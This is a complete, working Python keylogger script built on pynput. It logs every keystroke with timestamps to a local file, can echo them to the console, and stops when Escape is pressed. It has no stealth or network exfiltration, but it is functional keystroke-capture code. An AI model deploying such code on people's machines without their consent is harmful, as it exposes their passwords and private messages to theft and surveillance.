#!/usr/bin/env python3
"""
keylogger.py

A simple, user‐friendly keylogger using pynput.

Features:
- Logs every key press (with timestamps) to a file (default: keylog.txt).
- Optionally prints each keystroke to the console.
- Cleanly stops logging when the user presses the Escape key.
- Configurable via command‐line arguments.

Usage:
    python keylogger.py [--file OUTPUT_FILE] [--console]

Example:
    python keylogger.py --file mylog.txt --console

Prerequisites:
    pip install pynput
"""

import argparse
import sys
import time
from pynput.keyboard import Key, Listener


class Keylogger:
    """
    A class that captures and logs keyboard events.

    Attributes:
        log_file (str): Path to the output log file.
        print_console (bool): If True, prints each keystroke to stdout.
    """

    def __init__(self, log_file: str = "keylog.txt", print_console: bool = False):
        """
        Initialize the keylogger.

        Args:
            log_file (str): Path to the log file (default: "keylog.txt").
            print_console (bool): Whether to echo keystrokes to the console.
        """
        self.log_file = log_file
        self.print_console = print_console

    def _format_key(self, key) -> str:
        """
        Convert a Key or character into a readable string.

        Alphanumeric characters are returned as-is.
        Space, Enter, Tab get mapped to ' ', '\\n', '\\t'.
        Other special keys are wrapped in [KEY_NAME], e.g., [SHIFT].

        Args:
            key: A pynput.keyboard Key or a character.

        Returns:
            str: A human-readable representation of the key.
        """
        # alphanumeric
        if hasattr(key, 'char') and key.char is not None:
            return key.char

        # map some special keys
        if key == Key.space:
            return ' '
        if key == Key.enter:
            return '\n'
        if key == Key.tab:
            return '\t'

        # all others: e.g. Key.shift -> [SHIFT]
        name = key.name if hasattr(key, 'name') else str(key)
        return f'[{name.upper()}]'

    def _write_log(self, message: str):
        """
        Append a line of text to the log file.

        Args:
            message (str): The line to write (should include newline if desired).
        """
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(message)
        except Exception as e:
            # If we can't write, print to stderr and continue
            print(f"Error writing to log file: {e}", file=sys.stderr)

    def _on_press(self, key):
        """
        Callback invoked by pynput.Listener on each key press.

        Logs the key with a timestamp, writes to file, and optionally prints it.

        Args:
            key: The key that was pressed.
        """
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        key_str = self._format_key(key)
        # Compose the log line
        log_line = f"{timestamp} - {key_str}"
        # Ensure newline at end
        if not log_line.endswith('\n'):
            log_line += '\n'
        # Write to file
        self._write_log(log_line)
        # Optionally echo to console
        if self.print_console:
            # Use end='' because key_str may already contain newline
            print(log_line, end='')

    def _on_release(self, key):
        """
        Callback invoked by pynput.Listener on each key release.

        Stops the listener if Escape is released.

        Args:
            key: The key that was released.

        Returns:
            bool: False if listener should stop; None otherwise.
        """
        if key == Key.esc:
            # Log termination
            self._write_log(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ESCAPE: STOP]\n")
            if self.print_console:
                print("\n[Keylogger stopped by user pressing <Esc>]")
            # Returning False stops the Listener
            return False

    def start(self):
        """
        Start the keylogger. This method will block until the user presses <Esc>.
        """
        # Write a header to the log file
        header = (
            "==== Keylogger started at "
            f"{time.strftime('%Y-%m-%d %H:%M:%S')} ====\n"
        )
        self._write_log(header)
        if self.print_console:
            print(header, end='')

        # Start listening to keyboard events
        with Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            listener.join()


def parse_args():
    """
    Parse command‐line arguments.

    Returns:
        argparse.Namespace: The parsed arguments namespace.
    """
    parser = argparse.ArgumentParser(
        description="A simple Python keylogger using pynput."
    )
    parser.add_argument(
        "--file", "-f",
        dest="log_file",
        default="keylog.txt",
        help="Path to the output log file (default: keylog.txt)."
    )
    parser.add_argument(
        "--console", "-c",
        action="store_true",
        dest="print_console",
        help="If set, echo each keystroke to the console."
    )
    return parser.parse_args()


def main():
    """
    Entry point for the script. Parses arguments and starts the keylogger.
    """
    args = parse_args()
    kl = Keylogger(log_file=args.log_file, print_console=args.print_console)
    try:
        kl.start()
    except KeyboardInterrupt:
        # If user sends Ctrl+C, attempt to cleanly stop
        print("\n[Keylogger interrupted by user]")
        sys.exit(0)


if __name__ == "__main__":
    main()
